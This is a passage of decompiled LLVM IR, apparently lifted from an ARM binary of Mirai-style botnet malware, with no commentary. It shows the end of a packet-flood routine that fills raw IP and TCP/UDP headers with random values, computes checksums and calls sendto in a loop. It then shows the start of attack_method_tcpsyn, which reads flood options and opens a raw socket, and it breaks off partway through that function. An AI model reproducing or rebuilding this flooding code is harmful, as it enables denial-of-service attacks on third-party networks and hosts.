  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, 65280
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v5_c0e8 = call i32 @llvm.bswap.i32(i32 %v3_c0b8)
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v18_bae4, i32* %sb.global-to-local, align 4
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
